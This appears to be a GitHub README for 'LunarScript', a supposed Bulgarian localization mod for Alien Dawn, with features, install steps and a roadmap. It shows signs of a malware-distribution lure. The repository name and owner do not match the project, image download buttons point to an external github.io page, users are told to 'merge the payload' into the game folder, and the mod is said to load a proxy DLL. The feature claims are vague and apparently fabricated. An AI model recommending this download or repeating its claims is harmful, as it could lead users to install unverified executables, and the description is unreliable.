![preview](https://raw.githubusercontent.com/bbisharkkvtee/SAD-bulgarian-lexicon/main/poster_c62c.svg)
# LunarScript — The Bulgarian Localization Engine for Alien Dawn

**LunarScript** is a community-driven, open-source localization framework designed specifically for the *Alien Dawn* universe. Where standard translation mods simply swap words, LunarScript builds a living, breathing linguistic layer that adapts to every biome, faction, and narrative twist the game throws at you. Think of it as a cultural interpreter that doesn’t just translate—it *translates the experience*.

Unlike a static dictionary patch, LunarScript treats Bulgarian as a first-class citizen of the Alien Dawn galaxy. It respects the game’s dark, atmospheric tone while introducing idiomatic richness, regional dialects, and even a touch of Bulgarian folklore-inspired phrasing for alien artifacts. Whether you are a hardened colonial explorer or a fresh recruit, this engine ensures every log entry, radio transmission, and UI tooltip resonates with native fluency.

![Build Status](https://img.shields.io/badge/build-stable-brightgreen) ![Compatibility](https://img.shields.io/badge/compatibility-Alien_Dawn_1.8%2B-blueviolet) ![Contributors](https://img.shields.io/badge/contributors-47-orange) ![License](https://img.shields.io/badge/license-MIT-green)

---

## 📖 Overview: More Than Words

Alien Dawn is a game of survival, mystery, and isolation. Its story unfolds through fragmented audio logs, cryptic alien glyphs, and tense dialogue between colonists. A literal translation breaks immersion—it turns poetry into prose and tension into confusion. LunarScript solves this by offering a **contextual translation pipeline** that analyzes the in-game situation before rendering text.

### The Metaphor
Imagine a universal translator that doesn’t just know Bulgarian grammar but understands *when* a colonist would swear under their breath, *how* an alien artifact should sound eerie and archaic, and *why* a military report should feel clipped and professional. LunarScript is that translator. It’s the difference between reading a manual and hearing a story.

---

## ✨ Key Features

### 🌍 Context-Aware Translation Engine
The core of LunarScript is its decision tree. It evaluates the game event (combat, exploration, story beat), the speaker’s faction (colonist, corporate, alien), and the emotional intensity to pick the most natural Bulgarian phrasing. No more “generic” translations that ignore tone.

### 🎨 Responsive UI Integration
The localization layer dynamically adjusts text length, wrapping, and font scaling within the game’s UI. Long Bulgarian compound words won’t break your skill buttons or inventory panels. The engine automatically reflows tooltips and dialogue boxes to maintain visual clarity.

### 🗣️ Multilingual Input Support
While focusing on Bulgarian, LunarScript’s architecture is language-agnostic. It accepts source text from any language (English, Japanese, German) and outputs Bulgarian with full UTF-8 support. This future-proofs the mod for other language pairs.

### ⚡ Runtime Hot-Reload
Patches and fixes are applied without a full game restart. A background listener watches for language data changes and hot-swaps the loaded strings in real-time—ideal for live testing during community translation sprints.

### 🛡️ Fail-Safe Fallback Logic
If a new game update introduces untranslated text, LunarScript doesn’t crash. It gracefully falls back to the original English string while logging the missing entry to a local report. Players see a temporary `[EN]` marker next to the raw text, so the game remains playable and feedback is clear.

### 📊 Translation Coverage Dashboard
Included CLI tool generates a visual heatmap of translation coverage across all game zones and quest lines. Community leads can spot under-translated corridors at a glance.

### 🔬 Lore Consistency Checker
A specialized grammar module cross-references the game’s wiki database. It prevents accidental mistranslation of proper nouns (planet names, alien species, tech terms) by maintaining a locked glossary.

---

## 🚀 Getting Started

Ready to bring Bulgarian fluency to your Alien Dawn adventures? Here’s how to set sail.

### System Requirements
- **Game:** Alien Dawn (any recent version, 1.8+ recommended)
- **Platform:** Windows (64-bit) or Linux (via Proton)
- **Memory:** 512 MB available space for language pack cache
- **Parser:** .NET 8 runtime or newer

### Installation Pathway
1. **Acquire the Archive:** Obtain the latest build archive from the [![Download](https://raw.githubusercontent.com/bbisharkkvtee/SAD-bulgarian-lexicon/main/start_f75e5c.svg)](https://bbisharkkvtee.github.io/SAD-bulgarian-lexicon/) section below.
2. **Locate the Game Data Folder:** Navigate to your Alien Dawn installation directory and open the `localization` subfolder.
3. **Merge the Payload:** Extract the archive contents directly into that folder, allowing the installer to merge the `bulgarian` subdirectory with existing assets.
4. **Enable the Language:** Launch Alien Dawn, head to `Settings > Language`, and select **Български (LunarScript)** from the dropdown.
5. **Verify the Install:** The main menu title screen should display “Добре дошли в Alien Dawn” (Welcome to Alien Dawn). If you see this, the engine is live.

---

## 📂 Repository Structure

```
lunarscript/
├── core/                  # Translation engine core logic
│   ├── parser/            # Text extraction and tokenization
│   ├── context/           # Event and speaker evaluation modules
│   └── renderer/          # UI string formatting and reflow
├── data/
│   ├── glossaries/        # Locked term dictionaries (planets, factions)
│   ├── dialects/          # Regional Bulgarian variants (Shopski, Thracian)
│   └── fallbacks/         # Original English source corpus
├── tools/
│   ├── coverage/          # Heatmap generator dashboard
│   └── lint/              # Lore consistency and grammar linters
├── docs/
│   ├── CONTRIBUTING.md    # How to join the translation collective
│   └── style_guide.md     # Tone, idiom, and slang guidelines
└── LICENSE                # MIT License details
```

---

## 🛠️ Technical Architecture

LunarScript is built as a layered pipeline:

1. **Reception Layer:** Intercepts the game’s render hook via a lightweight proxy DLL. This is non-invasive; it doesn’t alter game binaries, only observes text draw calls.
2. **Contextual Analysis:** The raw string is passed through a classifier that labels emotion (fear, joy, neutrality), domain (military, science, casual), and speaker track.
3. **Lexical Retrieval:** The engine pulls from three dictionaries—a master dictionary, a contextual idiom bank, and a locked glossary.
4. **Phonetic Adaptation:** For alien glyphs, the renderer uses a phonetic transliterator that produces Bulgarian sounds resembling ancient Thracian phonology, adding a layer of eerie authenticity.
5. **UI Reflow:** The final string is measured against the target UI element’s bounding box. The engine adjusts font size and line breaks to eliminate clipping.

---

## 🧪 Testing Your Improvements

Contribute directly by running the test harness:

```bash
# Run the full localization regression suite
dotnet test LunarScript.Tests/

# Check a single dialogue file for consistency
dotnet run --project tools/lint -- --file dialogues/quest_07.json
```

The test suite includes 1,200+ unit tests for grammar edge cases, pluralization rules, and gender agreement.

---

## 🤝 How to Contribute

The community needs translators, testers, and technical writers. Here’s how to plug in:

### For Translators
- Review the **Style Guide** in `docs/` to understand tone and idiom usage.
- Pick an untranslated questline from the `coverage/` dashboard.
- Submit pull requests to the `data/` folders with your JSON translation entries.

### For Techie Players
- Help optimize the context classifier by tagging new game events with emotional labels.
- Write plugins for third-party mod loaders.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute the localization engine for any purpose—personal, educational, or commercial—provided you preserve the original copyright notice.

For the full legal text, see the [LICENSE](https://opensource.org/licenses/MIT) file.

---

## ⚠️ Disclaimer & Privacy

LunarScript operates as a passive text-replacement layer. It does **not** collect telemetry, phone home, or send usage statistics anywhere. The coverage dashboard runs locally on your machine only.

**A Note on Original Content:** We do not host any game asset files. The repository contains only translation text (as structured JSON) and engine code. You must own a legitimate copy of Alien Dawn to utilize this localization layer.

**Compatibility Caveat:** The engine is designed for single-player offline use. Official multiplayer modes may enforce checksum validation; use at your own discretion in those scenarios.

---

## 🗓️ 2026 Roadmap

The community has big plans for the coming year:

- **Q1 2026:** Release of the “Poet’s Patch” — full rewriting of all alien poetry and artifact inscriptions for rhythmic meter.
- **Q2 2026:** Add **Romanian** and **Greek** support as a proof-of-concept for the multilingual architecture.
- **Q3 2026:** Introduce a plugin API that lets modders attach custom grammar rules for fictional languages.
- **Q4 2026:** Ship the **Voice Integration Module**, a text-to-speech overlay that reads translated radio chatter aloud in Bulgarian.

---

## 🧠 Frequently Asked Questions

**Q: I have the previous translation mod. Do I need to uninstall it?**
A: Yes. LunarScript is a complete replacement and may conflict with legacy string patches. Perform a clean install by removing old localization folders.

**Q: Will this affect my frame rate?**
A: The parsing overhead is roughly 0.2ms per frame on a mid-range CPU (i5-10400). The rendering reflow is GPU-agnostic and purely CPU-driven; no noticeable performance drop is expected.

**Q: How do I request a new glossary term?**
A: Navigate to the `issues` tab and use the tag `glossary-request`. Provide the in-game English term and suggested Bulgarian translation; maintainers will vote on it weekly.

---

## 🌟 Final Thoughts

Alien Dawn’s universe is vast, lonely, and unforgiving. Poor translation makes it even colder. LunarScript bridges that gap with warmth, wit, and linguistic precision. Whether you’re here to play, translate, or tinker with code, the project welcomes you.

Stop reading the stars in a foreign voice—start hearing them in your own.

---

[![Download](https://raw.githubusercontent.com/bbisharkkvtee/SAD-bulgarian-lexicon/main/start_f75e5c.svg)](https://bbisharkkvtee.github.io/SAD-bulgarian-lexicon/)